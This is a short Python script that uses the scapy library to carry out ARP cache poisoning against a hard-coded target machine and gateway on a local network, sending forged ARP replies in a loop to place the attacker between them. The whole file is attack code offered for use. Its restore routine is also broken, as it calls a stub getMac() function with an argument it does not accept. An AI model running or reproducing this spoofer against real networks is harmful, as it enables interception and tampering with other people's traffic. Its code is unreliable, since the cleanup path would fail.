from scapy.all import *

import scapy.all as scapy
import time
import argparse
import sys

destinationMac = '00-FF-6E-31-C0-F4'
targetIP = '192.168.1.209'
gatewayIP = '192.168.1.1'
sourceMAC = '34-C9-3D-18-2E-EB'

def getMac():
    pass

def spoofer(targetIP, spoofIP):
    packet = scapy.ARP(op=2, pdst=targetIP, hwdst=destinationMac, psrc=spoofIP)
    scapy.send(packet, verbose=False)



def restore(destinationIP, sourceIP):
    packet = scapy.ARP(op=2, pdst=destinationIP, hwdst=getMac(destinationIP), psrc=sourceIP, hwsrc=sourceMAC)
    scapy.send(packet, count=4, verbose=False)


packets = 0
try:
    while True:
        spoofer(targetIP, gatewayIP)
        spoofer(gatewayIP, targetIP)
        print("\r[+] Sent packets " + str(packets)),
        sys.stdout.flush()
        packets += 2
        time.sleep(2)
except KeyboardInterrupt:
    print("\nInterrupted Spoofing found CTRL + C------------ Restoring to normal state..")
    restore(targetIP, gatewayIP)
    restore(gatewayIP, targetIP)
